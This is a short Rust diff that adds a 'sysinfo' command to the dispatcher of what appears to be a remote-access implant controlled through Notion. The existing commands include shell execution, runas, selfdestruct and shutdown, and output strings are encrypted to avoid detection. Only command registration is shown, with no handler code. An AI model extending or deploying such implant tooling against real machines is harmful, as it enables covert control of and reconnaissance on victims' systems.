@@ -25,7 +25,7 @@ mod shutdown;
 mod whoami;
 mod unknown;
 mod selfdestruct;
-
+mod sysinfo;
 
 /// Uses litcrypt to encrypt output strings
 /// and create `Ok(String)` output
@@ -62,6 +62,7 @@ pub enum CommandType {
     Runas,
     Shell,
     Shutdown,
+    Sysinfo,
     Whoami,
     Unknown
 }
@@ -183,6 +184,7 @@ impl NotionCommand {
                 "selfdestruct" => CommandType::Selfdestruct,
                 "shell"    => CommandType::Shell,
                 "shutdown" => CommandType::Shutdown,
+                "sysinfo"  => CommandType::Sysinfo,
                 "whoami"   => CommandType::Whoami,
                 _          => CommandType::Unknown,
             };
@@ -210,6 +212,7 @@ impl NotionCommand {
             CommandType::Selfdestruct => selfdestruct::handle().await,
             CommandType::Shell    => shell::handle(&mut self.args).await,
             CommandType::Shutdown    => shutdown::handle().await,
+            CommandType::Sysinfo    => sysinfo::handle().await,
             CommandType::Whoami      => whoami::handle().await,
             CommandType::Unknown  => unknown::handle().await,
         }
